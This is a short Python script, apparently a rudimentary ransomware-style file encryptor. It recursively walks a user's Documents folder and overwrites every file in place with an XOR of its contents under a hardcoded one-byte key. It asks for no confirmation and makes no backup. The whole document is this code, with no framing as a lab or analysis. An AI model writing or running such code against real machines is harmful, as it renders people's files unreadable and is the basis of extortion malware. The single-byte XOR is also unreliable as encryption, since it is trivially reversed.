import os

DIRECTORY = "/home/user/Documents"
XOR_KEY = 0x5A

def xor_encrypt_decrypt(file_path, key):
    """Encrypt or decrypt a file using XOR."""
    try:
        with open(file_path, "rb") as f:
            data = f.read()

        # XOR the data
        encrypted_data = bytes([byte ^ key for byte in data])

        with open(file_path, "wb") as f:
            f.write(encrypted_data)

        print(f"Processed: {file_path}")
    except Exception as e:
        print(f"Failed to process {file_path}: {e}")

def process_directory(directory, key):
    """Apply XOR encryption to all files in the directory."""
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            xor_encrypt_decrypt(file_path, key)

if __name__ == "__main__":
    process_directory(DIRECTORY, XOR_KEY)




